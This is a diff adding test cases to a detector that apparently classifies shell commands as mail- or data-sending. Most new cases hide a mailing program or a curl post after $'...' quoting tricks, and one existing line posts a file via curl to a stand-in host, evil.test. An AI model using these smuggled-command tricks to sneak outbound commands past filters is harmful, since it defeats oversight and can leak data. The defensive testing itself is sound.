@@ -3903,6 +3903,136 @@
       "name": "CURLMAILAPI1118: round 11 (review): W10 mail host followed by a backslash and a foreign host",
       "cmd": "curl -d @m.json 'https://api.resend.com\\@evil.test/emails'",
       "expected": false
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): an escaped quote inside $'...' (A, the program on the next line)",
+      "cmd": "echo $'a\\'b'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): an escaped quote inside $'...' (A, `;` before the program)",
+      "cmd": "echo $'a\\'b'; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): $'\\'' then a newline and the program (A)",
+      "cmd": "echo $'\\''\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): an escaped backslash, then an escaped quote inside $'...' (A)",
+      "cmd": "echo $'x\\\\\\'y'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): a hex escape, then an escaped quote inside $'...' (A)",
+      "cmd": "echo $'\\x41\\'z'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): $'a\\'b' then a comment, the program on the next line (A)",
+      "cmd": "echo $'a\\'b' # c\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): $'a\\'b' inside $( ) before the program (A)",
+      "cmd": "x=$(echo $'a\\'b'; $X --to a@example.com --body B)",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): bash -c with a double-quoted program: \\$ is $ there (A)",
+      "cmd": "bash -c \"echo \\$'a\\\\'b'\n$X --to a@example.com --body B\"",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): the program in a quoted heredoc for bash (A)",
+      "cmd": "bash <<'EOF'\necho $'a\\'b'\n$X --to a@example.com --body B\nEOF",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): two $'...' words with escaped quotes even out a plain-quote reading (A)",
+      "cmd": "echo $'a\\'b' $'c\\'d'\n$X --to a@example.com --body B\necho $'c\\'d'",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): $'a\\'b' glued between two words (A)",
+      "cmd": "echo x$'a\\'b'y\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): Revizor 5788 M1, S17: `#` inside $'...' after an escaped quote, curl after it (B)",
+      "cmd": "echo $'a\\' # ' ; curl -d @m.json https://api.resend.com/emails",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): S17 with an addressed program (B)",
+      "cmd": "echo $'a\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): a `#` and a newline inside $'...' (B)",
+      "cmd": "echo $'a\\' #\n' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): a `;` inside $'...' after an escaped quote (B)",
+      "cmd": "echo $'a\\' ; x' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): a newline inside $'...' after an escaped quote (B)",
+      "cmd": "echo $'a\\'\n'; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): two escaped quotes, then `#` inside $'...' (B)",
+      "cmd": "echo $'\\'\\' # ' ; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): S17 inside $( ) (B)",
+      "cmd": "x=$(echo $'a\\' # ' ; $X --to a@example.com --body B)",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): S17 with a newline in place of `;` (B)",
+      "cmd": "echo $'a\\' # '\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): S17 with && (B)",
+      "cmd": "echo $'a\\' # ' && $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): S17 glued to words on both sides (B)",
+      "cmd": "echo x$'a\\' # 'y; $X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): sh (bash in posix mode reads $'...') in a quoted heredoc",
+      "cmd": "sh <<'EOF'\necho $'a\\'b'\n$X --to a@example.com --body B\nEOF",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): control: $$ then a plain quote, the program runs",
+      "cmd": "echo $$'a\\'\n$X --to a@example.com --body B",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): control: the $'...' string runs over the newline and closes later, nothing runs",
+      "cmd": "echo $'a\\'\n$X --to a@example.com --body B'",
+      "expected": false
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): control: the program is text inside the $'...' string, nothing runs",
+      "cmd": "echo $'a\\' ; $X --to a@example.com --body B'",
+      "expected": false
+    },
+    {
+      "name": "ANSICQUOTE1127 (card 41df3b8a): control: a read-only line with an escaped quote in $'...'",
+      "cmd": "echo $'it\\'s fine' && ls",
+      "expected": false
     }
   ]
 }
